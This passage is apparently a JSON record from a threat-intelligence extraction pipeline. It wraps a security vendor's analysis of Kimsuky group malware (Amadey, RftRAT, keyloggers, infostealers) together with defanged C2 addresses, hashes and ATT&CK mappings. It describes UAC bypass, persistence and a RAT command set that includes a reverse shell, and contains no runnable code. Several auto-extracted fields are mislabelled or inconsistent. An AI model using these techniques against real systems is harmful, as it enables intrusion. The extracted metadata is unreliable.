GitHub. It was confirmed that the Kimsuky group was using XRat from a much earlier point in time. Recently  instead of in independent executable or DLL file formats  this is being used in attacks as an encrypted payload. It consists of the file  ht.dll  which is the loader  the data file  htsetting.ini  holding the configuration data  and an encrypted payload. This method seems to be for the purpose of bypassing security products. 5 / 2 0 The loader reads  decrypts  and injects the htsetting.ini file located in the same path. All ht.dll loaders identified so far were packed with VMP  and the decrypted binary contained the following strings used by the threat actor. Figure 3. Loader ht.dll packed with VMP The configuration file contains the name of the actual encrypted malware  the RC4 decryption key  and information on the legitimate file to inject into. Ht.dll references this information to read and decrypt the encrypted file before injecting it into a legitimate process. The payload that is injected and run in the end can be another malware besides XRat  depending on the encrypted file. 3.2. Amadey The Kimsuky group also used Amadey Bot in their attacks. Amadey is a malware that began being sold on illegal forums. It is a downloader that installs additional malware from the C C server. Besides such downloader features  it can also transmit basic information about the system or exfiltrate screenshots and account credentials saved in web browsers and email clients depending on the settings or whether certain plugins are installed. The Kimsuky group uses a dropper to install Amadey. This dropper  in DLL format  creates a randomly named hidden folder in the  PUBLIC  path where it drops the files it holds. The compressed file containing the actual Amadey is among the created files  and examining the compression size shows this file to be large  exceeding 300 MB. This is also presumed to be an attempt to evade security products by intentionally increasing the size. 6 / 2 0 Figure 4. Amadey-related files created in the Public path Afterward  it creates the path   ALLUSERSPROFILE \\Startup  and registers it to the Startup folder. Here  a script named  svc.vbs  is created  which is responsible for maintaining persistence. Amadey  which is loaded and executed through the Rundll32.exe process  goes through svchost.exe before being injected into the iexplore.exe process and run. Figure 5. The infected system s information transmitted to the C C server Even in 2023  the threat actor installed Amadey in many of their attacks  and in most instances  it was installed by the same type of dropper. Said dropper also included RftRAT besides Amadey. RftRAT  like Amadey  also has a file size exceeding 300 MB. The RftRAT instances identified in these attacks were all packed with VMP like Amadey and were found to contain the keyword  RFTServer  in the decrypted strings. RftRAT is a backdoor that can receive commands from the C C server and execute them. 7 / 2 0 Figure 6. Decrypted strings in RftRAT 3.3. Latest Attack Cases It was recently identified that the Kimsuky group has been using AutoIt to create malware. The Kimsuky group ported Amadey which had been used from the past to AutoIt and also used it for the purpose of injecting RftRAT. In past attack cases  only the debug string RFTServer was found  but in recent attacks  a malware containing a PDB path was found. The string within the PDB path shows that the threat actor named this malware  rft  as a RAT type. Accordingly  said malware is categorized as  RftRAT  here. Figure 7. RftRAT s PDB information PDB String: E:_WORK\\My_Work\\Exploit\\Spyware_spy\\RAT\\RFT_Socket_V3.2\\Release\\rft.pdb 3.3.1. AUTOIT AMADEY As covered above  Amadey is one of the malware that has been constantly used by the Kimsuky group. The version of Amadey used by the Kimsuky group is different from the type used by other threat actors: Kimsuky group s Amadey uses Domain Generation Algorithms 8 / 2 0 (DGA)  and when it scans for antivirus software installed in the infected system  it also searches for product names from South Korean companies. The recently identified Amadey is ported into the AutoIt language and has the same format as the types identified in the past attack cases. The threat actor installed both a legitimate AutoIt executable file and a compiled AutoIt script in the infected system. The compiled AutoIt script is 100 MB in size for the purpose of hindering analysis and contains dummy data as shown below. Figure 8. The compiled AutoIt script file used in the attacks Although written in a different language  the decrypted AutoIt script can be considered to be the Amadey malware. The HTTP request structure for sending the system information collected from the infected system to the C C server is identical to that of the typical Amadey. Figure 9. The structure of the HTTP packet that Amadey sends to the C C server Besides this  it also has a routine for checking for products from South Korean companies when retrieving the list of antivirus products installed in the infected system. Furthermore  it supports the feature to download additional payloads in not only an exe format  but also dll  PowerShell  vbs  and js formats. 9 / 2 0 Figure 10. The script where Amadey s routine is implemented As mentioned above  the Amadey used by the Kimsuky group supports DGA. DGA  also known as Domain Generation Algorithm  dynamically generates a domain (C C server address) instead of a fixed form. After dynamically obtaining the C C server address based on the date  the Kimsuky group used this as a subsidiary C C server. When the connection to the C C server was down  the subsidiary C C server generated through DGA was used for communication. Figure 11. Amadey s DGA 3.3.2. RFTRAT 1 0 / 2 0 The AutoIt scripts used in the attacks include Amadey and RftRAT. The AutoIt executable file and the malicious AutoIt script are also created through a dropper. The following ASD log shows the execution log of  d015700.dll   which is the dropper that installs RftRAT  and the log showing RftRAT ultimately creating an Infostealer after being injected into svchost.exe. Additionally  AppleSeed  another malware used by the Kimsuky group  was additionally installed in the same system afterward. Figure 12. Kimsuky group s attack log The RftRAT used in previous attacks is in DLL format and packed in VMP  so an exact comparison is difficult. However  it was categorized into the past version of RftRAT due to the fact that the same library file is used  that ICMLuaUtil is used to bypass UAC  and that the path names used for saving C C communication and command results are almost the same. 1 1 / 2 0 Figure 13. Strings in a past version of RftRAT similar to the latest version The compiled AutoIt script is similar to the Amadey in the case above  but it is actually an injector that executes svchost.exe and injects RftRAT into it. The ultimate payload RftRAT cannot be executed independently. Data must be read in from a mapped file named  A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0 . The injector AutoIt script writes the paths of the AutoIt executable file and script into this file. Figure 14. The paths of AutoIt-related files transmitted through a file mapping process 1 2 / 2 0 The transmitted paths of the AutoIt executable file and script are used later on in the UAC bypassing stage. RftRAT uses the ICMLuaUtil interface of the CMSTPLUACOM component to bypass UAC and execute itself as administrator. After being run as administrator  RftRAT collects basic information about the infected system and sends it to the C C server. Offset Data 0x0000Signature (0x963DA7EF) 0x0004Infected system s ID 0x0044IP address 0x014 Computer name Table 1. Data delivered to the C C server Figure 15. The packet used for communication with the C C server Afterward  it receives commands from the C C server. RftRAT writes the received commands to the path   APPDATA \\asc\\t1.pb  before decrypting them. Decryption yields the actual commands  which are written to the same file and reread to be executed. The command  the execution results  and the additionally downloaded file are created in the paths below. 1 3 / 2 0 Path Description  APPDATA \\asc\\t1.pbCommand downloaded from the C C server  APPDATA \\asc\\t2.axCommand execution results  APPDATA \\asc\\t3.brFile downloaded through the download command Table 2. Files generated during the C C communication and command processes CommandDescription 0x00 Download file 0x01 Upload file (zip compressed) 0x02 Look up driver information 0x04 Change file name 0x05 Create directory 0x06 Delete file 0x07 Execute file (with UAC Bypass) 0x08 Look up process information 0x09 Terminate process 0x0A Reverse shell 0x0B Terminate process and delete file 0x12 Terminate 0x14 Wait Table 3. RftRAT s commands 4. Post-infection After taking control of the infected system  to exfiltrate information  the Kimsuky group installs various malware such as keyloggers and tools for extracting accounts and cookies from web browsers. The group also installs Mimikatz and RDP Wrapper  which have both been steadily used for many years. 4.1. Keylogger 1 4 / 2 0 The keylogger is usually installed in the path   ALLUSERSPROFILE \\startup\\NsiService.exe . It persists in the system and monitors key input from the user  which is saved in the path   ALLUSERSPROFILE \\semantec\\av\\C_1025.nls  or   ALLUSERSPROFILE \\Ahn\\av\\C_1025.nls . Additionally    ALLUSERSPROFILE \\semantec  is a folder where the keylogger is installed  along with various malware covered in this article. 4.2. Infostealer Malware for collecting information from web browsers were created in the   ALLUSERSPROFILE \\semantec\\  path under the names  GBIA.exe    GBIC.exe    GBS.exe   and  GPIA.dll . While most target account credentials and cookies saved in web browsers  there are types that collect files in the  Local Extension Settings  path  which is the configuration data related to Chrome extensions. Figure 16. Stealing account credentials from a web browser Besides these  the tool named  GPIA.exe  looks up all paths in the infected system and displays the files in each folder. Because the file containing the paths of all files is naturally large  it also allows this file to be split-compressed. 1 5 / 2 0 Figure 17. System path lookup tool 4.3. Other Types A notable fact about the Kimsuky group is that it often abuses RDP for information theft. Accordingly  it either installs RDP Wrapper or uses a patcher malware for multiple sessions. Recently  there was a discovery of a malware that monitors the login records of the user. This seems to be for the purpose of finding out when the user logs in to use RDP to connect during idle times. The file  taskhosts.exe  installed in the path   ALLUSERSPROFILE \\semantec\\  is an injector that injects  ipcheck.dll  into the  explorer.exe  and  runtimebroker.exe  processes.  ipcheck.dll  monitors the user s log-on/log-off activities by hooking the  WinStationQueryInformationW()  and  ExitWindowsEx()  functions and the log is saved in the path   PUBLIC \\Log64.txt . 1 6 / 2 0 Figure 18. Log-on and log-off records saved in the log file The threat actor also used proxy malware. Proxy tools in the past were run by receiving command line arguments  but the type used by Kimsuky reads and uses a configuration file named  setting.ini . The port number 3389 configured in the default address indicates that it is likely to establish an RDP connection to a private network. Figure 19. Proxy malware 5. Conclusion 1 7 / 2 0 The Kimsuky threat group is continuously launching spear phishing attacks against South Korean users. Recently  malicious LNK files have been distributed to South Korean users with various topics  so users are advised to practice particular caution. The group usually employs the method of distributing malware through attachments or download links in emails. When a user executes them  the threat actor may be able to take control of the system that is currently in use. The Kimsuky group has been newly creating and using various malware to control infected systems and steal information. Recently  the group has been using AutoIt to create malware to bypass security products. Users must carefully check the senders of emails and refrain from opening files from unknown sources. It is also recommended to apply the latest patch for OS and programs such as Internet browsers and update V3 to the latest version to prevent such malware infection in advance. File Detection   Downloader/Win.Amadey.R626032 (2023.11.30.00)   Backdoor/Win.Agent.R626033 (2023.11.30.00)   Downloader/Win.Amadey.C5462118 (2023.07.28.03)   Trojan/AU3.Loader (2023.11.22.01)   Dropper/Win.Agent.C5542993 (2023.11.17.02)   Trojan/Win.Agent.C5430096 (2023.05.20.00)   Infostealer/Win.Agent.R622445 (2023.11.17.02)   Downloader/Win.Amadey.C5479015 (2023.08.31.01)   Trojan/Win.Agent.C5485099 (2023.09.11.03)   Trojan/Win.Agent.C5479017 (2023.08.31.01)   Trojan/Win.Loader.C5479014 (2023.08.31.01)   Trojan/Win.Agent.C5465186 (2023.11.30.00)   Infostealer/Win.Agent.C5542999 (2023.11.17.02)   Infostealer/Win.Agent.C5542997 (2023.11.17.02)   Trojan/Win.Agent.C5451959 (2023.11.30.00)   Trojan/Win.Agent.Prevention.C5446554 (2023.11.30.00)   Trojan/Win.Agent.R589022 (2023.06.28.02)   Trojan/Win.Loader.R588248 (2023.11.30.00)   Trojan/Win.Agent.C5444839 (2023.11.30.00)   Trojan/Win.Stealer.C5441397 (2023.11.30.00)   Trojan/Win.KeyLogger.C5430090 (2023.05.20.00)   Malware/Win.Generic.C5430065 (2023.11.30.00)   Trojan/Win.Stealer.R579484 (2023.05.20.00)   Trojan/Win.Loader.C5430091 (2023.05.20.00)   Trojan/Win.KeyLogger.C5430092 (2023.05.20.00) 1 8 / 2 0   Trojan/Win.Loader.C5430099 (2023.05.20.00)   Trojan/Win.Proxy.C5430093 (2023.05.20.00)   Trojan/Win.Agent.C5430095 (2023.05.20.00) Behavior Detection   Persistence/MDP.AutoIt.M4766   Injection/MDP.Hollowing.M4767 IOC MD5   f5ea621f482f9ac127e8f7b784733514 : RftRAT Dropper   AutoIt (d009086.dll)   7b6471f4430c2d6907ce4d349f59e69f : Amadey   AutoIt Script (adal.au3)   14a7f83d6215a4d4c426ad371e0810a2 : RftRAT   AutoIt Script (run.au3)   74d5dac64c0740d3ff5a9e3aca51ccdf : RftRAT   AutoIt Script (chkdisc.au3)   a7c9b4d70e4fad86598de37d7bf1fe96 : RftRAT   AutoIt Script (run.au3)   32696d9e1e72affaf8bc707ab271200d : Loader (ht.dll)   4b667f7ea5bdc9d872774f733fdf4d6a : Loader (ht.dll)   7f582f0c5c9a14c736927d4dbb47c5fa : Loader (ht.dll)   94aef716b23e8fa96808f1096724f77f : Loader (ht.dll)   0786984ab46482637c2d483ffbaf66dc : Loader (ht.dll)   1f63ce3677253636a273a88c5b26418d : Loader (ht.dll)   6f7cd8c0d9bfb0f97083e4431e4944c1 : Amadey Dropper (10.dll)   4fc726ab835ce559bada42e695b3d341 : Amadey Dropper (11.dll)   0fc1c99fd0d6f5488ab77e296216c7c6 : Amadey Dropper (10.dll)   f9c4d236b893c0d72321a9210359f530 : Amadey (svc4615.dll)   e22336eaf1980d2be5feed61b2dbc839 : Amadey (svc7014.dll)   862a855557cc274ab86e226e45338cff : Amadey (mtms2883.dll)   0f5762be09db44b2f0ccf05822c8531a : Amadey (ad53.dat)   c87094e261860e3a1f70b0681e1bc8c5 : Amadey (ad54.dat)   bac7f5eefe6a67e9555e93b0d950db59 : Amadey (d021999.dll)   c5a1305aba22c8fedd6624753849905b : Amadey (mtms02.dat)   068d395c60e32f01b5424e2a8591ba73 : Amadey (adal66.dat)   f3caa0f922600b4423ebcb16d7ea2dc6 : RftRAT Dropper (_e2.dll)   355817015c8510564c6ac89c976f2416 : RftRAT Dropper (_d2.dll)   d541aa6bae0f8c9bd7e7b6193b52e8f2 : RftRAT Dropper (d010943.dll)   093608a2d6eb098eb7ea917cc22e9998 : RftRAT Dropper (30.dll)   f76cde928a6eda27793ade673bcd6620 : RftRAT (msc1439.dll)   aaa42b1209ed54bfcbd2493fe073d59b : RftRAT (mtms1929.dll)   1003a440c710ddf7faa1a54919dd01d8 : RftRAT (rtm8668.dll)   b67e6e4c16e0309cfc2511414915df15 : RftRAT (cmms1106.dll)   4d4d485d3bfd3cbc97ed4b9a671f740f : RftRAT (cmms2366.dll)   cf3440fa165e3f78d2a2252a6924f702 : RftRAT (mtms7794.dll) 1 9 / 2 0   c55da826e50e2615903607e61968778f : RftRAT   d070cf19b66da341f64c01f8195afaed : RftRAT (r2.dat)   e665a985f71567f24a293ea430aad67d : RftRAT (r2.dat)   c52410ed6787c39db87c4158e73089d4 : RftRAT (r1.dat)   1ac0b0da11e413a21bec08713e1e7c59 : RftRAT (40.dat)   39e755c08156123e4cabac6bf8d1fd3a : RftRAT (a2.dat)   187aa9b12c05cd1ff030044786903e7e : KeyLogger (NsiService.exe)   b1337eb53b21594ac5dbd76138054ffb : KeyLogger (NsiService.exe)   d820ddb3026a5960b2c6f39780480d28 : KeyLogger (NsiService.exe)   5c2809177bb95edc68f9a08a96420bb7 : Stealer   Web browser (GBIA.exe)   0bf558adde774215bb221465a4edd2fe : Stealer   Web browser (GBIA.exe)   aa2cf925bae24c5cad2b1e1ad745b881 : Stealer   Web browser (GPIA.dll)   baa058003bf79ba82ac1b744ed8d58cb : Stealer   Chrome extension (GBS.exe)   38182f1f0a1cf598295cfbbabd9c5bf4 : Stealer   File path (GPIA.exe)   272c29bf65680b1ac8ec7f518780ba92 : Stealer   File path (GPIA.exe)   e860dac57933f63be9a374fb78bca209 : Proxy (svc.exe)   e96ca2aa7c6951802e4b17649cc5b581 : Injector (taskhosts.exe)   4eddf54757ae168450882176243d2bd2 : Injector (sihosts.exe)   119063c82373598d00d17734dd280016 : LogonMon (ipcheck.dll) C C   hxxps://prohomepage[.]net/index.php :Amadey   AutoIt Script   45.76.93[.]204:56001 : RftRAT   AutoIt Script   91.202.5[.]80:52030 : RftRAT   AutoIt Script   192.236.154[.]125:50108 : RftRAT   AutoIt Script   hxxp://brhosting[.]net/index.php : Amadey   hxxps://topspace[.]org/index.php : Amadey   hxxps://theservicellc[.]com/index.php : Amadey   hxxps://splitbusiness[.]com/index.php : Amadey   hxxps://techgolfs[.]com/index.php : Amadey   23.236.181[.]108:52390 : RftRAT   152.89.247[.]57:52390 : RftRAT   172.93.201[.]248:8083 : RftRAT   172.93.201[.]248:52390 : RftRAT   209.127.37[.]40:52390 : RftRAT Subscribe to AhnLab s next-generation threat intelligence platform  AhnLab TIP  to check related IOC and detailed analysis information. Categories:Malware Information Tagged as:Amadey Kimsuky RftRAT xRAT 2 0 / 2 0",
            "commands": [],
            "file_paths": [
              "/techgolfs[.]com/index.php",
              "/brhosting[.]net/index.php",
              "/Win.Generic.C5430065",
              "/splitbusiness[.]com/index.php",
              "/Win.Agent.R626033",
              "/Win.Agent.C5430095",
              "/Win.Agent.C5430096",
              "/prohomepage[.]net/index.php",
              "/",
              "/Win.Agent.C5485099",
              "/Win.KeyLogger.C5430090",
              "/MDP.AutoIt.M4766",
              "/topspace[.]org/index.php",
              "/Win.Agent.C5479017",
              "/MDP.Hollowing.M4767",
              "/Win.Stealer.R579484",
              "/Win.Agent.C5451959",
              "/Win.KeyLogger.C5430092",
              "/Win.Agent.C5542999",
              "/theservicellc[.]com/index.php",
              "/Win.Amadey.C5479015",
              "/Win.Loader.R588248",
              "/Win.Amadey.R626032",
              "/Win.Agent.R589022",
              "/Win.Stealer.C5441397",
              "/Win.Agent.Prevention.C5446554",
              "/Win.Proxy.C5430093",
              "/Win.Agent.C5465186",
              "/Win.Agent.C5444839",
              "/Win.Loader.C5430099",
              "/Win.Loader.C5479014",
              "/Win.Agent.C5542993",
              "/Win.Agent.C5542997",
              "/AU3.Loader",
              "/Win.Amadey.C5462118",
              "/Win.Loader.C5430091",
              "/Win.Agent.R622445"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Keylogger",
              "Loader",
              "Malware",
              "Metasploit",
              "Mimikatz",
              "RAT",
              "Trojan",
              "backdoor",
              "conti",
              "downloader",
              "dropper",
              "payload"
            ],
            "tools": [
              "Metasploit",
              "Mimikatz",
              "NET",
              "PowerShell",
              "Rundll32",
              "at",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "10.dll",
              "11.dll",
              "30.dll",
              "40.dat",
              "AU3.Loader",
              "GBIA.exe",
              "GBIC.exe",
              "GBS.exe",
              "GPIA.dll",
              "GPIA.exe",
              "Ht.dll",
              "Log64.txt",
              "MDP.AutoIt",
              "MDP.Hollowing",
              "NsiService.exe",
              "Rundll32.exe",
              "Win.Agent",
              "Win.Agent.Prevention",
              "Win.Amadey",
              "Win.Generic",
              "Win.KeyLogger",
              "Win.Loader",
              "Win.Proxy",
              "Win.Stealer",
              "a2.dat",
              "ad53.dat",
              "ad54.dat",
              "adal66.dat",
              "asec.ahnlab.com",
              "cmms1106.dll",
              "cmms2366.dll",
              "d009086.dll",
              "d010943.dll",
              "d015700.dll",
              "d021999.dll",
              "explorer.exe",
              "ht.dll",
              "htsetting.ini",
              "iexplore.exe",
              "index.php",
              "ipcheck.dll",
              "msc1439.dll",
              "mtms02.dat",
              "mtms1929.dll",
              "mtms2883.dll",
              "mtms7794.dll",
              "r1.dat",
              "r2.dat",
              "rft.pdb",
              "rtm8668.dll",
              "runtimebroker.exe",
              "setting.ini",
              "sihosts.exe",
              "svc.exe",
              "svc.vbs",
              "svc4615.dll",
              "svc7014.dll",
              "svchost.exe",
              "t1.pb",
              "t1.pbCommand",
              "t2.axCommand",
              "t3.brFile",
              "taskhosts.exe"
            ],
            "hashes": {
              "md5": [
                "068d395c60e32f01b5424e2a8591ba73",
                "0786984ab46482637c2d483ffbaf66dc",
                "093608a2d6eb098eb7ea917cc22e9998",
                "0bf558adde774215bb221465a4edd2fe",
                "0f5762be09db44b2f0ccf05822c8531a"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing",
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "PowerShell",
              "User Execution: Malicious File"
            ],
            "persistence": [
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Process Injection"
            ],
            "credential_access": [
              "OS Credential Dumping",
              "Input Capture"
            ],
            "lateral_movement": [
              "Remote Desktop Protocol"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /techgolfs[.]com/index.php\n- /brhosting[.]net/index.php\n- /Win.Generic.C5430065\n- /splitbusiness[.]com/index.php\n- /Win.Agent.R626033\n\n**Network Indicators:**\n- MDP.AutoIt\n- r2.dat\n- svc.exe\n- ad54.dat\n- t2.axCommand\n- taskhosts.exe\n- index.php\n- d009086.dll\n- iexplore.exe\n- Win.Agent.Prevention\n\n**Key Security Terms:** establish, upload, payload, extract, task, persistence, execute, download, backdoor, terminate"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 18.663,
          "llm_processing_time_ms": 6714.3730000000005
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "fc54a1e5-59af-4588-901b-3997e5a3bba4",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Remote Control Malware",
        "attack_id": "T1219",
        "tactic": "Persistence",
        "description": "The Kimsuky group installs remote control malware to control the infected system after completing initial access steps. Malware used by the Kimsuky group includes custom-made malware such as AppleSeed and PebbleDash, as well as open-source or commercial malware such as XRat, HVNC, Amadey, and Metasploit Meterpreter.",
        "confidence_score": 0.809,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.668,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "remote control malware",
          "XRat",
          "HVNC",
          "Amadey",
          "Metasploit Meterpreter"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "Metasploit",
          "sc",
          "zip",
          "HVNC",
          "XRat",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit Meterpreter"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7a75405c-9f97-43b1-84ad-591b938f9a49",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Spear Phishing Attack",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "The Kimsuky group employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations.",
        "confidence_score": 0.78,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.556,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "spear phishing emails",
          "LNK shortcut-type malware",
          "compressed files"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c1716a04-7cb9-439f-ad50-82e61db3c199",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "LNK Malware",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "The LNK file contains an encrypted compressed file, which in turn holds various malware in script format. Executing the LNK file decompresses the file, and ultimately, the script malware is run.",
        "confidence_score": 0.779,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.548,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "LNK files",
          "encrypted compressed files",
          "script malware"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "LNK malware",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d381f505-4a3f-4776-acb7-cbceff5956bd",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Persistence",
        "attack_id": "T1050",
        "tactic": "Persistence",
        "description": "There is also a script for maintaining persistence as well as a downloader that downloads and executes additional payloads from an external source.",
        "confidence_score": 0.764,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.484,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "persistence script",
          "downloader"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "persistence script",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "downloader",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "13b36b22-f66c-4121-b8c1-721cc1be5746",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Proxy",
        "attack_id": "T1090",
        "tactic": "Command and Control",
        "description": "The threat actor used proxy malware to establish an RDP connection to a private network",
        "confidence_score": 0.749,
        "confidence_level": "very_low",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.345,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "svc.exe",
          "setting.ini",
          "3389"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "Proxy",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "9b7884b7-8c7f-4271-acbc-94097f14ffd6",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Persistence",
        "attack_id": "T1050",
        "tactic": "Persistence",
        "description": "Amadey malware creates a script named 'svc.vbs' in the '%ALLUSERSPROFILE%\\Startup' path to maintain persistence",
        "confidence_score": 0.739,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "svc.vbs",
          "%ALLUSERSPROFILE%\\Startup"
        ],
        "tools": [
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Rundll32.exe",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d90b9844-5056-4c6b-a24a-f954cb5ac8ad",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Remote Control Malware",
        "attack_id": "T1219",
        "tactic": "Command and Control",
        "description": "Kimsuky Group uses remote control malware (RftRAT, Amadey) for command and control",
        "confidence_score": 0.732,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "RftRAT",
          "Amadey"
        ],
        "tools": [
          "RftRAT",
          "Amadey",
          "at",
          "metasploit",
          "rundll32",
          "Rundll32",
          "zip",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "59303722-1c26-434a-95bb-594b9e71721f",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Persistence",
        "attack_id": "T1050",
        "tactic": "Persistence",
        "description": "The keylogger persists in the system and monitors key input from the user",
        "confidence_score": 0.73,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "%ALLUSERSPROFILE%\\startup\\NsiService.exe"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "Keylogger",
          "NET",
          "ping",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "003ae8fb-ec81-462a-a33f-459447009e4b",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Code Obfuscation",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "The loader reads, decrypts, and injects the htsetting.ini file located in the same path. All ht.dll loaders identified so far were packed with VMP, and the decrypted binary contained the following strings used by the threat actor.",
        "confidence_score": 0.723,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.596,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "VMP packing",
          "ht.dll",
          "htsetting.ini"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "VMP",
          "Mimikatz",
          "PowerShell",
          "mimikatz",
          "reg",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "19815082-d3f2-4113-89fc-43cc5c849c79",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Loader",
        "attack_id": "T1050",
        "tactic": "Defense Evasion",
        "description": "Kimsuky Group uses AutoIt to create malware (XRat loader)",
        "confidence_score": 0.722,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "XRat",
          "AutoIt"
        ],
        "tools": [
          "rundll32",
          "at",
          "metasploit",
          "zip",
          "Rundll32",
          "sc",
          "Mimikatz",
          "XRat",
          "PowerShell",
          "mimikatz",
          "reg",
          "AutoIt",
          "powershell",
          "ping",
          "NET",
          "Metasploit"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f464998b-63db-4f1f-af88-8da62c6a8589",
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "technique_name": "Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
